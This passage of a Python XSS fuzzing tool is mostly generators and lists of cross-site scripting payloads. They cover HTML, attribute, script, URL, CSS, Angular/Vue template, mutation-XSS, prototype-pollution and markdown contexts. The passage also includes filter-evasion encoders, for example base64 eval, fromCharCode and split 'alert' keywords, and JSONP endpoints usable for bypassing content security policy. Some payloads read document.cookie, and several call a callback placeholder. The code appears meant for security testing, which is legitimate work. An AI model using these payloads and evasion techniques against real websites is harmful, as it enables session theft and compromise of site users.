    ("audio-src-slash", "<audio src/onerror=alert('__M__')>"),
    ("video-source-onerror", "<video><source onerror=alert('__M__')>"),
    ("track-onerror", "<track src=x onerror=alert('__M__')>"),
    ("input-file-oncancel", "<input type=file oncancel=alert('__M__')>"),
    ("input-beforeinput", "<input onbeforeinput=alert('__M__')>"),
    ("body-onpageshow", "<body onpageshow=alert('__M__')>"),
    ("svg-onscrollend", "<svg onscrollend=alert('__M__')>"),
    ("select-oninvalid", "<select required oninvalid=alert('__M__')>"),
    ("form-onformdata", "<form onformdata=alert('__M__')><input name=x>"),
    ("marquee-onbounce", "<marquee behavior=alternate onbounce=alert('__M__')>x</marquee>"),
    ("noscript-img", "<noscript><img src=x onerror=alert('__M__')></noscript>"),
    ("template-img", "<template><img src=x onerror=alert('__M__')></template>"),
    ("data-uri-a", "<a href=\"data:text/html,<script>alert('__M__')</script>\">x</a>"),
    ("js-parenless", "<svg onload=alert`__M__`>"),
    ("js-window-open", "<script>window.open('javascript:alert(\\'__M__\\')')</script>"),
    ("js-range", "<svg onload=((()=>{alert('__M__')})())>"),
    ("attr-contenteditable", "<div contenteditable onfocus=alert('__M__') autofocus>x</div>"),
    ("attr-pointerrawupdate", "<div onpointerrawupdate=alert('__M__')>x</div>"),
    ("attr-beforexrselect", "<div onbeforexrselect=alert('__M__')>x</div>"),
    ("attr-onpagereveal", "<body onpagereveal=alert('__M__')>"),
    ("attr-onprerenderingchange", "<body onprerenderingchange=alert('__M__')>"),
]

# Handlers and tags that are useful for generation but often missing from
# older lists. Kept separate so they can be merged into every HTML-ish context.
MODERN_EVENTS = [
    "oncontentvisibilityautostatechange", "onbeforetoggle", "ontoggle",
    "onbeforematch", "onformdata", "onpageshow", "onpagereveal",
    "onprerenderingchange", "onscrollend", "onclose", "oncancel", "oncommand",
    "oninvalid", "onbounce", "onpointerrawupdate", "onbeforexrselect",
    "onbeforeprint", "onafterprint", "onbeforeinput", "onbeforecopy",
    "onbeforecut", "onbeforepaste",
]

# ---------------------------------------------------------------------------
# Systematic generation (keeps the bundled corpus large and diverse)
# ---------------------------------------------------------------------------

_AUTO_EVENTS = [
    "onerror", "onload", "onfocus", "onbegin", "onstart", "ontoggle",
    "onanimationstart", "onanimationend", "onanimationiteration",
    "ontransitionend", "onpointerover", "onpointerenter", "onauxclick",
    "onbeforeinput", "oninput", "onchange", "onsubmit", "onreset",
] + MODERN_EVENTS
_INTERACT_EVENTS = [
    "onmouseover", "onclick", "onmousedown", "onmouseup", "onmousemove",
    "onmouseenter", "onmouseleave", "oncontextmenu", "onwheel", "ondblclick",
    "onkeydown", "onkeyup", "onkeypress", "onpaste", "oncopy", "oncut",
    "ondrag", "ondragend", "ondrop", "onselect", "onblur",
]
_TAGS_AUTO = [
    ("svg", "<svg {ev}=alert('__M__')>"),
    ("body", "<body {ev}=alert('__M__')>"),
    ("img", "<img src=x {ev}=alert('__M__')>"),
    ("input", "<input autofocus {ev}=alert('__M__')>"),
    ("details", "<details open {ev}=alert('__M__')>"),
    ("marquee", "<marquee {ev}=alert('__M__')>"),
    ("video", "<video src=x {ev}=alert('__M__')>"),
    ("audio", "<audio src=x {ev}=alert('__M__')>"),
    ("source", "<source src=x {ev}=alert('__M__')>"),
    ("track", "<track src=x {ev}=alert('__M__')>"),
    ("iframe", "<iframe {ev}=alert('__M__')>"),
    ("object", "<object {ev}=alert('__M__')>"),
    ("embed", "<embed src=x {ev}=alert('__M__')>"),
    ("xss", "<xss {ev}=alert('__M__')>"),
    ("math", "<math {ev}=alert('__M__')>"),
    ("select", "<select autofocus {ev}=alert('__M__')>"),
    ("textarea", "<textarea autofocus {ev}=alert('__M__')>"),
    ("dialog", "<dialog open {ev}=alert('__M__')>"),
    ("form", "<form {ev}=alert('__M__')>"),
    ("a", "<a href=# {ev}=alert('__M__')>x</a>"),
]


def _gen_html_variants():
    out = []
    for tag, tmpl in _TAGS_AUTO:
        events = _AUTO_EVENTS if tag in ("svg", "body", "img", "input", "details",
                                        "marquee", "video", "audio", "source",
                                        "track", "iframe", "object", "xss") else _AUTO_EVENTS[:8]
        for ev in events:
            out.append(("gen:%s:%s" % (tag, ev), tmpl.format(ev=ev)))
    for ev in _INTERACT_EVENTS:
        out.append(("gen:a:%s" % ev, "<a href=# %s=alert('__M__')>x</a>" % ev))
        out.append(("gen:xss:%s" % ev, "<xss %s=alert('__M__')>x</xss>" % ev))
    return out


def _gen_attr_variants():
    dq = []
    sq = []
    uq = []
    tags = [("<svg", "onload"), ("<img src=x", "onerror"), ("<iframe", "onload"),
            ("<body", "onload"), ("<details open", "ontoggle")]
    for tag, ev in tags:
        vec = "%s %s=alert('__M__')>" % (tag, ev)
        dq.append(("gen-dq:" + ev, "\">" + vec))
        dq.append(("gen-dq-space:" + ev, "\" " + ev + "=\"alert('__M__')\""))
        sq.append(("gen-sq:" + ev, "'>" + vec))
        sq.append(("gen-sq-space:" + ev, "' " + ev + "='alert('__M__')'"))
        uq.append(("gen-uq:" + ev, " " + ev + "=alert('__M__') "))
    return dq, sq, uq


def _gen_script_variants():
    out = []
    for quote in ("'", '"', "`"):
        q = quote
        out.append(("gen-script:break" + q, q + ";alert('__M__');//"))
        out.append(("gen-script:concat" + q, q + "+alert('__M__')+//"))
    out += [
        ("gen-script:close", "</script><svg onload=alert('__M__')>"),
        ("gen-script:comment", "*/alert('__M__');/*"),
        ("gen-script:newline", "\nalert('__M__')\n"),
        ("gen-script:parenless", "alert`__M__`"),
    ]
    return out


def _gen_corpus_categories():
    """Classify bundled source vectors into context categories."""
    buckets = {
        "corpus_html": [], "corpus_url": [], "corpus_csti": [],
        "corpus_script": [], "corpus_proto": [],
    }
    seen = set()
    for src in ("portswigger.txt", "hexbrain.txt", "2026-update.txt",
                "extras-2026.txt", "cheatsheet-2026.txt"):
        tag = src.split(".")[0]
        for idx, p in enumerate(_load(src)):
            if p in seen:
                continue
            seen.add(p)
            low = p.lower()
            if "__proto__" in low or "constructor[prototype]" in low:
                buckets["corpus_proto"].append(("%s:%d:proto" % (tag, idx), p))
            elif "{{" in p or "ng-app" in low or "v-html" in low:
                buckets["corpus_csti"].append(("%s:%d:csti" % (tag, idx), p))
            elif low.startswith("javascript:") or low.startswith("data:text/html") or low.startswith("data%3a"):
                buckets["corpus_url"].append(("%s:%d:url" % (tag, idx), p))
            elif "<script" in low or "</script" in low:
                buckets["corpus_script"].append(("%s:%d:script" % (tag, idx), p))
                buckets["corpus_html"].append(("%s:%d:html" % (tag, idx), p))
            elif "<" in p:
                buckets["corpus_html"].append(("%s:%d:html" % (tag, idx), p))
            else:
                buckets["corpus_html"].append(("%s:%d:html" % (tag, idx), p))
    return buckets


def _fullwidth(p):
    return "".join(chr(ord(ch) + 0xFEE0) if 0x21 <= ord(ch) <= 0x7E else ch for ch in p)


def _zwsp_tag(p):
    return re.sub(r"<([a-zA-Z]+)", lambda m: "<" + "\u200b".join(m.group(1)), p)


def _css_escape(p):
    return "".join("\\%x " % ord(ch) if ch.isalnum() else ch for ch in p)


def _js_octal(p):
    return "".join("\\%o" % ord(ch) if ord(ch) < 128 else ch for ch in p)


def _utf7(p):
    b = p.encode("utf-7")
    return "".join("%%%02X" % x for x in b)


def _utf16le(p):
    return "".join("%%%02X%%%02X" % (x & 0xFF, x >> 8) for x in p.encode("utf-16-le"))


def _utf16be(p):
    return "".join("%%%02X%%%02X" % (x >> 8, x & 0xFF) for x in p.encode("utf-16-be"))


def _qp(p):
    out = quopri.encodestring(p.encode(), quotetabs=True).decode()
    return out.replace("\n", "")


def _b64_eval(p):
    b = base64.b64encode(p.encode()).decode()
    return "eval(atob('%s'))" % b


def _b64_script(p):
    b = base64.b64encode(("<script>" + p + "</script>").encode()).decode()
    return "data:text/html;base64," + b


def _html_named(p):
    table = {"<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
             "&": "&amp;", ":": "&colon;", "(": "&lpar;", ")": "&rpar;",
             " ": "&nbsp;"}
    return "".join(table.get(ch, ch) for ch in p)


def _url_partial(p):
    return "".join("%%%02X" % ord(ch) if ch in "<>\"'` " else ch for ch in p)


_CANARY_QUOTED = re.compile(r"(['\"])(__M__|zq[0-9a-f]{6,})\1")


def _noquote(p, wrapper):
    """Replace quotes around the canary with a quote-less JS literal.

    Many filters HTML-escape quotes inside <script> (turning alert('tok') into
    alert(&#039;tok&#039;) -> SyntaxError) while alert(1) still fires. These
    variants keep the canary in a form that survives and is observable.
    """
    return _CANARY_QUOTED.sub(lambda m: wrapper % m.group(2), p)


ENCODERS = {
    "lt-url": lambda p: p.replace("<", "%3C"),
    "lt-url2": lambda p: p.replace("<", "%253C"),
    "lt-html": lambda p: p.replace("<", "&lt;"),
    "url": lambda p: urllib.parse.quote(p, safe=""),
    "url2": lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
    "url3": lambda p: urllib.parse.quote(
        urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""), safe=""),
    "url4": lambda p: urllib.parse.quote(
        urllib.parse.quote(urllib.parse.quote(
            urllib.parse.quote(p, safe=""), safe=""), safe=""), safe=""),
    "url-partial": _url_partial,
    "html-dec": lambda p: "".join("&#%d;" % ord(ch) for ch in p),
    "html-dec-pad": lambda p: "".join("&#%03d;" % ord(ch) for ch in p),
    "html-hex": lambda p: "".join("&#x%x;" % ord(ch) for ch in p),
    "html-hex-pad": lambda p: "".join("&#x%04x;" % ord(ch) for ch in p),
    "html-named": _html_named,
    "html-mixed": lambda p: "".join(
        ("&#x%x;" % ord(ch)) if i % 2 else ch for i, ch in enumerate(p)
        if ch.isalnum() or ch in "<>():'\"") or p,
    "js-unicode": lambda p: "".join("\\u%04x" % ord(ch) for ch in p),
    "js-unicode-brace": lambda p: "".join("\\u{%x}" % ord(ch) for ch in p),
    "js-hex": lambda p: "".join("\\x%02x" % ord(ch) if ord(ch) < 256 else ch for ch in p),
    "js-octal": _js_octal,
    "js-entities": lambda p: p.replace("alert", "\\u0061lert").replace(
        "javascript", "\\u006aavascript").replace("<", "\\u003c").replace(">", "\\u003e"),
    "css-escape": _css_escape,
    "mixed": lambda p: "".join(ch.swapcase() if ch.isalpha() else ch for ch in p),
    "comment": lambda p: (p.replace("<script", "<scr<!---->ipt")
                           .replace("<svg", "<s<!---->vg")
                           .replace("<img", "<i<!---->mg")),
    "comment-attr": lambda p: p.replace("=", "/**/=").replace(" ", "/**/"),
    "tab": lambda p: p.replace(" ", "\t"),
    "newline": lambda p: p.replace(" ", "\n"),
    "cr": lambda p: p.replace(" ", "\r"),
    "formfeed": lambda p: p.replace(" ", "\f"),
    "null": lambda p: p + "%00",
    "zwsp": _zwsp_tag,
    "fullwidth": _fullwidth,
    "utf7": _utf7,
    "utf16le": _utf16le,
    "utf16be": _utf16be,
    "quoted-printable": _qp,
    "hex-pairs": lambda p: "".join("%%%02x" % ord(ch) for ch in p),
    "b64": lambda p: base64.b64encode(p.encode()).decode(),
    "b64-eval": _b64_eval,
    "b64doc": lambda p: "data:text/html;base64," + base64.b64encode(p.encode()).decode(),
    "b64-script": _b64_script,
    "atob-eval": lambda p: "eval(atob('%s'))" % base64.b64encode(p.encode()).decode(),
    "fromcharcode": lambda p: "String.fromCharCode(%s)" % ",".join(
        str(ord(ch)) for ch in p),
    "reverse": lambda p: p[::-1],
    "noquote-ident": lambda p: _noquote(p, "%s"),
    "noquote-regex": lambda p: _noquote(p, "/%s/"),
    "noquote-template": lambda p: _noquote(p, "`%s`"),
    # --- detection-mechanism ladder (when a keyword like `alert` is blocked) ---
    "alt-prompt": lambda p: _CALL_RE.sub(lambda m: "prompt(%s)" % m.group(2), p),
    "alt-confirm": lambda p: _CALL_RE.sub(lambda m: "confirm(%s)" % m.group(2), p),
    "alt-print": lambda p: _CALL_RE.sub(lambda m: "print(%s)" % m.group(2), p),
    "alt-console": lambda p: _CALL_RE.sub(lambda m: "console.log(%s)" % m.group(2), p),
    "call-template": lambda p: _CALL_RE.sub(
        lambda m: "%s`%s`" % (m.group(1), m.group(2).strip("'\"")), p),
    "call-optional": lambda p: _CALL_RE.sub(
        lambda m: "%s?.(%s)" % (m.group(1), m.group(2)), p),
    "call-comma": lambda p: _CALL_RE.sub(
        lambda m: "(0,%s)(%s)" % (m.group(1), m.group(2)), p),
    "call-concat": lambda p: _CALL_RE.sub(
        lambda m: "self['ale'+'rt'](%s)" % m.group(2), p),
    "call-atob": lambda p: _CALL_RE.sub(
        lambda m: "window[atob('YWxlcnQ=')](%s)" % m.group(2), p),
    "call-throw": lambda p: _CALL_RE.sub(
        lambda m: "window.onerror=%s;throw %s" % (m.group(1), m.group(2)), p),
    "call-title": lambda p: _CALL_RE.sub(
        lambda m: "document.title=%s" % m.group(2), p),
    "call-unicode": lambda p: _CALL_RE.sub(
        lambda m: "\\u0061lert(%s)" % m.group(2), p),
    "call-constructor": lambda p: _CALL_RE.sub(
        lambda m: "[].constructor.constructor`alert\\x28%s\\x29`()" %
                  m.group(2).strip("'\""), p),
}

ENCODER_NAMES = list(ENCODERS.keys())


def _dec_b64(s):
    try:
        return base64.b64decode(s + "=" * (-len(s) % 4)).decode("utf-8", "replace")
    except Exception:
        return s


def _dec_hex(s):
    try:
        return binascii.unhexlify(re.sub(r"[^0-9a-fA-F]", "", s)).decode("utf-8", "replace")
    except Exception:
        return s


def _dec_qp(s):
    try:
        return quopri.decodestring(s.encode()).decode("utf-8", "replace")
    except Exception:
        return s


def _dec_utf16(s, order="be"):
    try:
        raw = bytes(int(x, 16) for x in re.findall(r"%([0-9A-Fa-f]{2})", s))
        return raw.decode("utf-16-" + order, "replace")
    except Exception:
        return s


DECODERS = {
    "lt-url": lambda s: s.replace("%3C", "<").replace("%3c", "<"),
    "lt-html": lambda s: s.replace("&lt;", "<").replace("&LT;", "<"),
    "url": urllib.parse.unquote,
    "url2": lambda s: urllib.parse.unquote(urllib.parse.unquote(s)),
    "url3": lambda s: urllib.parse.unquote(
        urllib.parse.unquote(urllib.parse.unquote(s))),
    "html": html.unescape,
    "js-unicode": lambda s: re.sub(r"\\u\{?([0-9a-fA-F]{1,6})\}?",
                                   lambda m: chr(int(m.group(1), 16)), s),
    "js-hex": lambda s: re.sub(r"\\x([0-9a-fA-F]{2})",
                               lambda m: chr(int(m.group(1), 16)), s),
    "js-octal": lambda s: re.sub(r"\\([0-7]{1,3})",
                                 lambda m: chr(int(m.group(1), 8)), s),
    "b64": _dec_b64,
    "hex": _dec_hex,
    "quoted-printable": _dec_qp,
    "utf16be": lambda s: _dec_utf16(s, "be"),
    "utf16le": lambda s: _dec_utf16(s, "le"),
    "fullwidth": lambda s: "".join(
        chr(ord(ch) - 0xFEE0) if 0xFF01 <= ord(ch) <= 0xFF5E else ch for ch in s),
}


def _looks_text(s):
    if not s:
        return False
    good = sum(1 for ch in s if ch.isprintable() or ch in "\t\r\n")
    return good / max(1, len(s)) > 0.8 and "\ufffd" not in s


def decode_all(text):
    """Try every decoder and return (name, decoded) for useful changes."""
    out = []
    for name, fn in DECODERS.items():
        try:
            got = fn(text)
        except Exception:
            continue
        if got and got != text and _looks_text(got):
            out.append((name, got))
    return out


def _gen_encoding_variants():
    bases = []
    for cat in ("html", "attr_dq", "attr_sq", "script", "url"):
        bases.extend(p for _, p in CURATED[cat][:18])
    out = []
    for i, p in enumerate(bases):
        for en, fn in ENCODERS.items():
            if en == "b64doc":
                continue
            try:
                out.append(("gen-enc:%s:%d" % (en, i), fn(p)))
            except Exception:
                pass
    return out


def _gen_url_variants():
    out = []
    calls = ["alert('__M__')", "alert(document.domain)", "alert`__M__`"]
    schemes = ["javascript", "JaVaScRiPt", "java\tscript", "java\nscript",
               "java\rscript", " javascript", "jav&#x61;script"]
    for i, c in enumerate(calls):
        for j, s in enumerate(schemes):
            out.append(("gen-url:%d:%d" % (i, j), "%s:%s" % (s, c)))
    return out



# ---------------------------------------------------------------------------
# Bulk generation: guarantee deep coverage in every context category
# ---------------------------------------------------------------------------

_ATTR_TAGS = [
    "svg", "img", "iframe", "body", "video", "audio", "source", "track",
    "input", "details", "marquee", "xss", "math", "object", "embed", "form",
    "select", "textarea", "a", "div", "button", "dialog", "meter", "base",
    "keygen", "template", "table", "style", "title", "plaintext",
]
_ATTR_EVENTS = [
    "onload", "onerror", "onfocus", "onmouseover", "onclick", "onpointerover",
    "onanimationstart", "onanimationend", "ontoggle", "onbegin", "onstart",
    "oninput", "onchange", "onsubmit", "oncontextmenu", "ondblclick",
    "onwheel", "ondrag", "ondrop", "onkeydown", "onkeyup", "onpaste",
    "oncopy", "oncut", "onselect", "onblur", "onauxclick", "onpointerenter",
    "onpointerdown", "onbeforetoggle", "onbeforematch", "onsearch",
]
_SCRIPT_CORES = [
    "alert('__M__')", "alert`__M__`", "confirm('__M__')", "prompt('__M__')",
    "print('__M__')", "eval('alert(\"__M__\")')",
    "Function('alert(\"__M__\")')()",
    "constructor.constructor('alert(\"__M__\")')()",
    "setTimeout('alert(\"__M__\")')", "window['ale'+'rt']('__M__')",
    "top['alert']('__M__')", "String.fromCharCode(__FCC__)",
    "alert(document.domain)", "alert(document.cookie)",
    "eval(atob('__B64__'))", "top.constructor('alert(\"__M__\")')()",
]
_JSONP_HOSTS = [
    "https://www.google.com/complete/search?client=chrome&jsonp=",
    "https://suggestqueries.google.com/complete/search?client=chrome&jsonp=",
    "https://www.youtube.com/oembed?callback=",
    "https://soundcloud.com/oembed?callback=",
    "https://api.twitter.com/1/statuses/oembed.json?callback=",
    "https://api.instagram.com/oembed?callback=",
    "https://www.reddit.com/api/info.json?callback=",
    "https://disqus.com/embed/comments/?callback=",
    "https://api.github.com/repos/x/y?callback=",
    "https://api.flickr.com/services/rest/?method=flickr.test.echo&callback=",
    "https://api.tumblr.com/v2/blog/x.tumblr.com/info?callback=",
    "https://api.vimeo.com/videos/x?callback=",
    "https://api.spotify.com/v1/search?callback=",
    "https://api.twitch.tv/kraken/search/channels?callback=",
    "https://api.imgur.com/3/gallery.json?callback=",
    "https://www.googleapis.com/customsearch/v1?jsonp=",
    "https://maps.googleapis.com/maps/api/js?callback=",
    "https://api.stackexchange.com/2.3/questions?callback=",
    "https://api.weather.com/v1/location/x?callback=",
    "https://api.nytimes.com/svc/search/v2/articlesearch.json?callback=",
    "https://api.wunderground.com/api/x/conditions/q/x.json?callback=",
    "https://api.dailymotion.com/video/x?callback=",
    "https://api.spotify.com/v1/me?callback=",
    "https://api.priceapi.com/products/single?callback=",
    "https://api.coinbase.com/v2/prices/spot?callback=",
]
_MXSS_OUTER = [
    "<math>", "<math><mtext>", "<form>", "<form><math>", "<table>",
    "<table><math>", "<select>", "<option>", "<noscript>", "<style>",
    "<xmp>", "<textarea>", "<title>", "<svg>", "<svg><foreignObject>",
    "<svg><desc>", "<svg><title>", "<template>", "<noembed>", "<noframes>",
    "<plaintext>", "<body>", "<head>", "<html>", "<div>", "<p>", "<a>",
    "<math><mtext><table>", "<math><mglyph>", "<table><math><mtext>",
]
_MXSS_INNER = [
    "<img src=x onerror=alert('__M__')>",
    "<svg onload=alert('__M__')>",
    "<script>alert('__M__')</script>",
    "<iframe srcdoc=\"<script>alert('__M__')</script>\">",
    "<style><img src=x onerror=alert('__M__')></style>",
    "<a href=javascript:alert('__M__')>x</a>",
    "<form><button formaction=javascript:alert('__M__')>x",
    "<math><mtext><mglyph><style><img src=x onerror=alert('__M__')>",
]
_ANGULAR_EXPRS = [
    # Single-quoted inner call: survives targets that HTML-encode double quotes
    # (e.g. PortSwigger "AngularJS expression" lab) and yields valid JS after
    # canaryize (which wraps the canary in single quotes by default).
    "constructor.constructor('alert(\\'__M__\\')')()",
    "constructor.constructor('alert(1)//__M__')()",
    "constructor.constructor('alert(`__M__`)')()",
    "constructor.constructor('alert(String.fromCharCode(49))//__M__')()",
    "constructor.constructor('alert(\"__M__\")')()",
    "toString.constructor('alert(\"__M__\")')()",
    "$eval.constructor('alert(\"__M__\")')()",
    "$on.constructor('alert(\"__M__\")')()",
    "$watch.constructor('alert(\"__M__\")')()",
    "valueOf.constructor('alert(\"__M__\")')()",
    "charAt.constructor('alert(\"__M__\")')()",
    "prototype.constructor('alert(\"__M__\")')()",
    "this.constructor.constructor('alert(\"__M__\")')()",
    "[].constructor.constructor('alert(\"__M__\")')()",
    "{}['constructor']['constructor']('alert(\"__M__\")')()",
    "constructor.constructor('alert`__M__`')()",
    "constructor.constructor('alert(document.domain)')()",
    "constructor.constructor('alert(document.cookie)')()",
    "x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()",
]
_ANGULAR_WRAPPERS = [
    "{{%s}}", "<div ng-app>{{%s}}</div>", "<div ng-app=\"\">{{%s}}</div>",
    "<div ng-bind-html=\"%s\"></div>", "<div ng-bind=\"%s\"></div>",
    "<div ng-model=\"%s\"></div>", "<input ng-model=\"%s\">",
    "<div ng-controller=\"%s\"></div>", "{{$eval(%s)}}", "{{%s|}}",
    "<div ng-init=\"%s\"></div>", "<div ng-show=\"%s\"></div>",
    "<div ng-if=\"%s\"></div>", "<div ng-click=\"%s\"></div>",
    "<div data-ng-app>{{%s}}</div>", "<div x-ng-app>{{%s}}</div>",
    "<div ng:app>{{%s}}</div>", "<ng-app>{{%s}}</ng-app>",
    "<div ng-switch=\"%s\"></div>", "<div ng-repeat=\"%s\"></div>",
]
_VUE_EXPRS = [
    "constructor.constructor('alert(\"__M__\")')()",
    "_c.constructor('alert(\"__M__\")')()",
    "_v.constructor('alert(\"__M__\")')()",
    "_s.constructor('alert(\"__M__\")')()",
    "$options.constructor('alert(\"__M__\")')()",
    "this.constructor.constructor('alert(\"__M__\")')()",
    "_vm.constructor('alert(\"__M__\")')()",
    "_self.constructor('alert(\"__M__\")')()",
    "toString.constructor('alert(\"__M__\")')()",
    "valueOf.constructor('alert(\"__M__\")')()",
    "prototype.constructor('alert(\"__M__\")')()",
    "[].constructor.constructor('alert(\"__M__\")')()",
    "{}['constructor']['constructor']('alert(\"__M__\")')()",
    "constructor.constructor('alert`__M__`')()",
    "constructor.constructor('alert(document.domain)')()",
]
_VUE_WRAPPERS = [
    "{{%s}}", "<div v-html=\"%s\"></div>", "<div v-bind:title=\"%s\"></div>",
    "<div :title=\"%s\"></div>", "<div v-on:click=\"%s\"></div>",
    "<div @click=\"%s\"></div>", "<div v-model=\"%s\"></div>",
    "<div v-show=\"%s\"></div>", "<div v-if=\"%s\"></div>",
    "<div v-for=\"%s\"></div>", "<div v-text=\"%s\"></div>",
    "<div v-html=\"'%s'\"></div>", "<template v-html=\"%s\"></template>",
    "<div>{{%s}}</div>", "<div v-pre>{{%s}}</div>",
    "<div v-once>{{%s}}</div>", "<div v-cloak>{{%s}}</div>",
    "<component :is=\"%s\">", "<div :class=\"%s\">", "<div :style=\"%s\">",
]
_DOM_TEMPLATES = [
    "document.body.innerHTML=%s", "document.body.outerHTML=%s",
    "document.write(%s)", "document.writeln(%s)", "eval(%s)",
    "setTimeout(%s)", "setInterval(%s)", "Function(%s)()",
    "location=%s", "location.href=%s", "location.assign(%s)",
    "location.replace(%s)", "element.insertAdjacentHTML('beforeend',%s)",
    "element.appendChild(%s)", "$(element).html(%s)",
    "document.querySelector('x').innerHTML=%s", "window.name=%s",
    "history.pushState({},'',%s)", "new Function(%s)()",
    "setTimeout(function(){%s},0)", "element.animate(%s)",
]
_PROTO_KEYS = [
    "innerHTML", "outerHTML", "src", "href", "url", "data", "template",
    "html", "text", "callback", "hitCallback", "onload", "onerror",
    "onclick", "style", "srcdoc", "action", "formaction", "postMessage",
    "message", "value", "content", "code", "script", "eval", "constructor",
    "prototype", "toString", "valueOf", "then", "done", "success",
]
_PROTO_VALS = [
    "<img src=x onerror=alert('__M__')>", "<svg onload=alert('__M__')>",
    "javascript:alert('__M__')", "alert('__M__')",
    "<script>alert('__M__')</script>", "javascript:alert`__M__`",
    "data:text/html,<script>alert('__M__')</script>",
    "&lt;img src=x onerror=alert('__M__')&gt;",
    "<iframe srcdoc=\"<script>alert('__M__')</script>\">",
    "fetch('__CB__')",
    "constructor.constructor('alert(\"__M__\")')()",
]
_POST_TARGETS = ["parent", "opener", "top", "self", "frames[0]", "window",
                 "document.defaultView", "iframe.contentWindow",
                 "w=open('')", "worker"]
_JSONP_CALLBACKS = _SCRIPT_CORES[:12]
_MD_TEMPLATES = [
    "[x](%s)", "![x](%s)", "[x]: %s", "[x][a]\n\n[a]: %s",
    "<a href=\"%s\">x</a>", "[x](<%s>)", "`%s`", "<img src=x onerror=alert('__M__')>",
    "|%s|", "[x](%s \"t\")", "[x](%s 't')", "[x](%s (t))",
    "[click](%s){:target=_blank}", "<script>%s</script>",
    "<svg onload=%s>", "![x](%s \"t\")", "<javascript:%s>",
    "[x](data:text/html,%s)", "~~~\n%s\n~~~", "    %s",
]
_MD_PAYLOADS = [
    "javascript:alert('__M__')", "javascript:alert`__M__`",
    "data:text/html,<script>alert('__M__')</script>",
    "<script>alert('__M__')</script>", "<svg onload=alert('__M__')>",
    "<img src=x onerror=alert('__M__')>", "javascript:alert(document.domain)",
    "javascript:alert(document.cookie)", "java\tscript:alert('__M__')",
    "java&#x0a;script:alert('__M__')", "&#106;avascript:alert('__M__')",
    "javascript&colon;alert('__M__')", "<iframe srcdoc=\"<script>alert('__M__')</script>\">",
    "alert('__M__')", "vbscript:msgbox('__M__')",
    "http://x/\"onmouseover=\"alert('__M__')",
    "data:image/svg+xml,<svg onload=alert('__M__')>",
    "javascript:alert('__M__')//", "data:text/html;base64,__B64__",
    "constructor.constructor('alert(\"__M__\")')()",
]
_FILE_WRAPPERS = [
    "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"%s\"/>",
    "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>%s</script></svg>",
    "<html><body onload=\"%s\">", "<html><script>%s</script></html>",
    "<?xml version=\"1.0\"?><svg onload=\"%s\">",
    "GIF89a;<script>%s</script>", "PNG;<svg onload=\"%s\">",
    "%%PDF-1.3;<script>%s</script>",
    "Content-Type: text/html\n\n<script>%s</script>",
    "<math><mtext><script>%s</script></math>", "<body onload=%s>",
    "<iframe srcdoc=\"%s\">", "<object data=\"data:text/html,%s\">",
    "<embed src=\"data:text/html,%s\">", "<a href=\"data:text/html,%s\">x</a>",
    "<svg><script href=\"data:,%s\"/>", "<svg><script xlink:href=\"data:,%s\"/>",
    "<xss style=\"background:url(%s)\">",
]
_FILE_CORES = [
    "alert('__M__')", "alert`__M__`", "alert(document.domain)",
    "alert(document.cookie)", "<script>alert('__M__')</script>",
    "<img src=x onerror=alert('__M__')>", "<svg onload=alert('__M__')>",
    "javascript:alert('__M__')", "eval(atob('__B64__'))",
    "constructor.constructor('alert(\"__M__\")')()",
    "data:text/html,<script>alert('__M__')</script>",
    "fetch('__CB__')", "top['alert']('__M__')",
    "String.fromCharCode(__FCC__)", "window['ale'+'rt']('__M__')",
    "document.write('<img src=x onerror=alert(\"__M__\")>')",
    "alert(/__M__/.source)", "print('__M__')", "confirm('__M__')",
    "prompt('__M__')",
]
_RCDATA_CLOSERS = [
    "</textarea>", "</title>", "</xmp>", "</noscript>", "</noembed>",
    "</noframes>", "</iframe>", "</plaintext>", "</style>", "</script>",
    "</svg>", "</template>",
]


def _gen_bulk():
    out = {"attr_dq": [], "attr_sq": [], "attr_unquoted": [], "script": [],
           "url": [], "css": [], "comment": [], "svg": [], "mxss": [],
           "csp": [], "polyglot": [], "angular": [], "vue": [], "dom": [],
           "prototype": [], "postmessage": [], "jsonp": [], "markdown": [],
           "file": [], "rcdata": [], "waf": [], "firewall": []}

    # attribute contexts
    for tag in _ATTR_TAGS:
        for ev in _ATTR_EVENTS[:15]:
            out["attr_dq"].append(("bulk:dq-ev", '" %s=alert(\'__M__\') x="' % ev))
            out["attr_dq"].append(("bulk:dq-tag", '"><%s %s=alert(\'__M__\')>' % (tag, ev)))
            out["attr_sq"].append(("bulk:sq-ev", "' %s=alert('__M__') x='" % ev))
            out["attr_sq"].append(("bulk:sq-tag", "'><%s %s=alert('__M__')>" % (tag, ev)))
            out["attr_unquoted"].append(("bulk:uq-ev", " %s=alert('__M__') " % ev))
            out["attr_unquoted"].append(("bulk:uq-tag", "><%s %s=alert('__M__')>" % (tag, ev)))

    # script contexts
    for q in ("'", '"', "`"):
        for b in (";", "\n", "\r", "//", "/*", "*/", "};", "];", "-->", "</script>"):
            for c in _SCRIPT_CORES[:8]:
                out["script"].append(("bulk:scr", q + b + c + "//"))
                out["script"].append(("bulk:scr2", q + c + q + ";"))
    for tag in _ATTR_TAGS[:20]:
        for ev in _ATTR_EVENTS[:16]:
            out["script"].append(("bulk:scr-close",
                                  "</script><%s %s=alert('__M__')>" % (tag, ev)))

    # url contexts
    for sep in (":", "&colon;", "&#58;", "&#x3a;", "%3a"):
        for lead in ("", " ", "\t", "\n", "\r"):
            for c in _SCRIPT_CORES[:10]:
                out["url"].append(("bulk:url", lead + "javascript" + sep + c))
    for c in _SCRIPT_CORES[:12]:
        out["url"].append(("bulk:data", "data:text/html," + c))
        out["url"].append(("bulk:datab64", "data:text/html;base64," +
                           base64.b64encode(("<script>" + c + "</script>").encode()).decode()))
        out["url"].append(("bulk:vb", "vbscript:msgbox('__M__')"))

    # css contexts
    for tag in _ATTR_TAGS[:20]:
        for ev in _ATTR_EVENTS[:16]:
            out["css"].append(("bulk:css-break",
                               "</style><%s %s=alert('__M__')>" % (tag, ev)))
    for fn in ("expression", "-moz-binding:url", "behavior:url",
               "background:url", "background-image:url", "list-style-image:url",
               "cursor:url", "@import url", "-o-link:url", "-webkit-image-set(url"):
        for c in ("javascript:alert('__M__')", "vbscript:msgbox('__M__')",
                  "data:text/html,<script>alert('__M__')</script>",
                  "javascript:alert`__M__`"):
